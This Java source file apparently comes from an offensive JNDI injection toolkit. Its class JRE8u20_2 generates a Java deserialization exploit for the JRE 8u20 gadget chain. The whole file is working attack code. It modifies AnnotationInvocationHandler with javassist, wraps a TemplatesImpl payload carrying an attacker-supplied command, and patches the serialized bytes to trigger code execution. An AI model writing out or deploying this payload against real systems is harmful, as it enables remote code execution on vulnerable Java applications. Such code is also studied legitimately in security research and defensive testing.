package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.utils.*;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

import static com.qi4l.jndi.Starter.JYsoMode;
import static com.qi4l.jndi.Starter.cmdLine;

public class  JRE8u20_2 implements ObjectPayload<Object> {
    public static Class newInvocationHandlerClass() throws Exception {
        ClassPool pool  = ClassPool.getDefault();
        CtClass   clazz = pool.get(Gadgets.ANN_INV_HANDLER_CLASS);
        CtMethod writeObject = CtMethod.make("    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException {\n" +
                "        os.defaultWriteObject();\n" +
                "    }", clazz);
        clazz.addMethod(writeObject);
        Class c = clazz.toClass();
        return c;
    }


    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        final Object templates;
        if (JYsoMode.contains("yso")) {
            templates = GadgetsYso.createTemplatesImpl(param[0]);
        } else {
            templates = Gadgets.createTemplatesImpl(type, param);
        }

        Class       ihClass     = newInvocationHandlerClass();
        Constructor constructor = ihClass.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler ih = (InvocationHandler) constructor.newInstance(Override.class, new HashMap<>());

        Reflections.setFieldValue(ih, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(ih, Templates.class);

        BeanContextSupport b = new BeanContextSupport();
        Reflections.setFieldValue(b, "serializable", 1);
        HashMap tmpMap = new HashMap<>();
        tmpMap.put(ih, null);
        Reflections.setFieldValue(b, "children", tmpMap);


        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
        set.add(b);
        set.add(templates);
        set.add(proxy);

        HashMap hm = new HashMap();
        hm.put("f5a5a608", templates);
        Reflections.setFieldValue(ih, "memberValues", hm);

        byte[] ser = Serializer.serialize(set);

        byte[] shoudReplace = new byte[]{0x78, 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78, 0x71};

        int i = ByteUtil.getSubarrayIndex(ser, shoudReplace);
        ser = ByteUtil.deleteAt(ser, i); // delete 0x78
        ser = ByteUtil.deleteAt(ser, i); // delete 0x70

        return ser;
    }
}
